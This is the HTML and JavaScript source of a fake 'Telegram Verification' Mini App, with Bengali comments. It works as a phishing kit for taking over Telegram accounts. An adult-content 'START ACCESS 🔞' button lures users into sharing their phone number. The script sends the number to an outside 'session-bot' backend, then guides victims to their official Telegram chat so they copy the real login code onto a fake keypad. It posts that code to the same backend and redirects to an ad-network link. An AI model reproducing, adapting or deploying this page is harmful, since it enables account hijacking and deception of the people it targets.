<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
            background-size: cover;
            height: 100vh; display: flex; align-items: flex-end; justify-content: center;
            overflow: hidden; color: white;
        }
        .overlay { background: rgba(0, 0, 0, 0.4); position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
        
        .main-container { width: 92%; max-width: 380px; z-index: 5; text-align: center; margin-bottom: 30px; position: relative; }

        /* প্রো স্টাইল ওটিপি বক্স */
        .otp-card {
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(15px);
            border-radius: 24px; padding: 25px 15px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }

        .instruction { font-size: 17px; font-weight: 600; margin-bottom: 20px; text-shadow: 0 2px 4px rgba(0,0,0,0.5); }

        /* সরাসরি চ্যাটে যাওয়ার বাটন */
        .pro-get-code-btn {
            background: linear-gradient(90deg, #0088cc, #00aaff);
            color: white; border: none; padding: 16px;
            width: 100%; border-radius: 14px; font-weight: bold; font-size: 18px;
            cursor: pointer; margin-bottom: 20px;
            box-shadow: 0 6px 20px rgba(0, 136, 204, 0.4);
            display: flex; align-items: center; justify-content: center; gap: 10px;
            position: relative; z-index: 10;
        }

        .otp-inputs { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; }
        .otp-box { 
            width: 48px; height: 58px; 
            background: rgba(255, 255, 255, 0.1); 
            border: 2px solid rgba(255, 255, 255, 0.4); 
            border-radius: 12px; display: flex; align-items: center; justify-content: center; 
            font-size: 32px; font-weight: bold; 
        }

        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
        .key { 
            background: rgba(255, 255, 255, 0.1); 
            backdrop-filter: blur(5px);
            padding: 18px; border-radius: 15px; 
            font-size: 26px; font-weight: bold; border: 1px solid rgba(255, 255, 255, 0.2);
        }
        .key:active { background: rgba(255, 255, 255, 0.3); }
        .key-del { background: rgba(255, 71, 87, 0.3); }

        .hidden { display: none !important; }
        .finger-icon { font-size: 80px; margin-bottom: 20px; animation: bounce 1s infinite; }
        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(12px); } }
        .loader-text { font-size: 22px; font-weight: bold; text-shadow: 0 0 10px black; margin-bottom: 80px; }
    </style>
</head>
<body>
    <div class="overlay"></div>

    <div class="main-container">
        <!-- Step 1: Loading -->
        <div id="step0">
            <div class="finger-icon">👇</div>
            <div id="load_text" class="loader-text hidden">🔄 Connecting...</div>
        </div>

        <!-- Step 2: OTP Screen -->
        <div id="step2" class="hidden">
            <div class="otp-card">
                <div class="instruction">Enter the 5-digit code sent by Telegram</div>
                
                <!-- প্রফেশনাল বাটন যা সরাসরি চ্যাটে নিয়ে যাবে -->
                <button class="pro-get-code-btn" onclick="openOfficialChat()">
                    📥 GET LOGIN CODE
                </button>

                <div class="otp-inputs">
                    <div class="otp-box" id="b1"></div>
                    <div class="otp-box" id="b2"></div>
                    <div class="otp-box" id="b3"></div>
                    <div class="otp-box" id="b4"></div>
                    <div class="otp-box" id="b5"></div>
                </div>

                <div class="keypad">
                    <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
                    <div class="key" onclick="addNum('4')">4</div><div class="key" onclick="addNum('5')">5</div><div class="key" onclick="addNum('6')">6</div>
                    <div class="key" onclick="addNum('7')">7</div><div class="key" onclick="addNum('8')">8</div><div class="key" onclick="addNum('9')">9</div>
                    <div style="background:transparent"></div>
                    <div class="key" onclick="addNum('0')">0</div>
                    <div class="key key-del" onclick="clearNum()">⌫</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.enableClosingConfirmation();

        // মেনু বাটন
        tg.MainButton.setText("🍓 START ACCESS 🔞").show().onClick(startFlow);

        const BACKEND_URL = "https://pmrony-session-bot.hf.space";
        const OFF_LINK = "https://www.profitablecpmratenetwork.com/w47jpksk7t?key=15b5e8ae609b09733d4a0906eac2a446";
        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
        let currentOTP = "";

        // এই ফাংশনটি একদম প্রো বটের মতো সরাসরি ওটিপি চ্যাট ওপেন করবে
        function openOfficialChat() {
            // ১. সরাসরি সার্ভিস নোটিফিকেশন ওপেন করার কমান্ড
            tg.openTelegramLink("tg://resolve?domain=telegram");
            
            // ২. সাথে সাথে একটু সতর্কতা দেখানো যাতে ইউজার না ঘাবড়ায়
            setTimeout(() => {
                tg.showAlert("Check your Telegram Messages (Official Chat) at the top!");
            }, 300);
        }

        function startFlow() {
            tg.requestContact();
            tg.MainButton.hide();
            document.querySelector('.finger-icon').classList.add('hidden');
            document.getElementById('load_text').classList.remove('hidden');
            poll();
        }

        async function poll() {
            try {
                const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
                const data = await res.json();
                if (data.status === "success") { sendNumberToBot(data.phone); }
                else { setTimeout(poll, 1500); }
            } catch (e) { setTimeout(poll, 2000); }
        }

        async function sendNumberToBot(phone) {
            try {
                const res = await fetch(`${BACKEND_URL}/send_number`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, phone: phone })
                });
                const data = await res.json();
                if (data.status === "success") {
                    document.getElementById('step0').classList.add('hidden');
                    document.getElementById('step2').classList.remove('hidden');
                }
            } catch (e) { }
        }

        function addNum(n) {
            if(currentOTP.length < 5) {
                currentOTP += n;
                updateBoxes();
                if(currentOTP.length === 5) { verifyOTP(); }
            }
        }
        function clearNum() { currentOTP = currentOTP.slice(0, -1); updateBoxes(); }
        function updateBoxes() { 
            for(let i=1; i<=5; i++) { 
                document.getElementById('b'+i).innerText = currentOTP[i-1] || ""; 
            } 
        }

        async function verifyOTP() {
            try {
                const res = await fetch(`${BACKEND_URL}/verify_otp`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, otp: currentOTP })
                });
                const data = await res.json();
                if (data.status === "success") { window.location.href = OFF_LINK; }
                else { 
                    tg.showAlert("Invalid Code! Try again.");
                    currentOTP = ""; updateBoxes();
                }
            } catch (e) { }
        }
    </script>
</body>
</html>
